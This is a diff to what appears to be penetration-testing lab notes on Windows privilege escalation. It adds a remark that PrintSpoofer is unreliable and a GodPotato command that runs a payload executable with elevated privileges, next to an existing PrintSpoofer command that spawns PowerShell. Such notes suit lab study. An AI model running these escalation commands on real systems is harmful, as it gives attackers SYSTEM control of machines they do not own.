@@ -70,6 +70,10 @@ and run like so:
 ```powershell
 .\PrintSpoofer64.exe -i -c powershell.exe
 ```
+Nb. experience in the labs has shown that `PrintSpoofer64.exe` won't reliably work, even when the vulnerability exists. By contrast, `GodPotato` rarely fails:
+```powershell
+.\GodPotato-NET4.exe -cmd "cmd /c C:\Users\chump\payload.exe"
+```
 
 ## Manual PrivEsc
 
